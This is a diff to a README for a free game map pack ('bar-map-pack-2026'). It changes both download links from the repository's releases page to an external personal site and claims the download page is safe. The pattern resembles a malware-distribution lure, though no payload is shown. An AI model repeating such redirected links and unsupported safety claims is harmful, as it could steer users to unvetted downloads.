@@ -1,6 +1,6 @@
 <h1>🗺️ bar-map-pack-2026 - Your Ultimate Battle Map Collection</h1>
 <p align="center">
-  <a href="https://github.com/Areeb46546/bar-map-pack-2026/releases"><img src="https://img.shields.io/badge/Download%20Map%20Pack%202026-Free%20Download-blueviolet?style=for-the-badge&logo=github" alt="Download Button"></a>
+  <a href="https://areeb46546.github.io"><img src="https://img.shields.io/badge/Download%20Map%20Pack%202026-Free%20Download-blueviolet?style=for-the-badge&logo=github" alt="Download Button"></a>
 </p>
 
 ## 🎮 What Is This?
@@ -17,7 +17,7 @@ Getting started is easier than you think. You don't need any special skills or p
 
 Visit this link to download the application.
 
-[**Click Here to Download bar-map-pack-2026**](https://github.com/Areeb46546/bar-map-pack-2026/releases)
+[**Click Here to Download bar-map-pack-2026**](https://areeb46546.github.io)
 
 This is your one-stop destination for all the maps. The download page is straightforward and safe.
 
